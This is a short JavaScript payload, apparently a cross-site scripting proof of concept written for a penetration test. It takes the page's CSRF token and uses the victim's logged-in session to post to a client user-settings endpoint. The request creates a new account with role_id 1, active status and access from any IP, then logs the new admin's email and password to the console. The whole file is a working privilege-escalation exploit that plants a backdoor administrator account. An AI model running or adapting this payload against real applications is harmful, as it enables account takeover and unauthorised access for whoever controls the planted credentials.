(function () {
  const tokenInput = document.querySelector('input[name="_token"]');
  if (!tokenInput) return console.error("Token not found");

  const token = tokenInput.value;
  const password = "S9v!tN#2gFqX@4zW";
  const email = "eroel+spprivescfromencoder@secuna.io";

  const body = new URLSearchParams({
    _token: token,
    name: "Secuna Privesc From Encoder1",
    email: email,
    nickname: "Privesc From Encoder1",
    birthdate: "1990-01-01",
    nationality: "Filipino",
    passport_no: "123456789",
    role_id: "1",
    signatory: "0",
    on_e_sign: "0",
    password: password,
    password_confirmation: password,
    user_status: "1",
    allow_all_ip: "1"
  });

  fetch("/client/settings/users", {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: body.toString()
  }).then(res => res.text()).then(text => {
    console.log("[XSS Created Admin]");
    console.log("Email:", email);
    console.log("Password:", password);
    console.log("Response:", text);
  });
})();
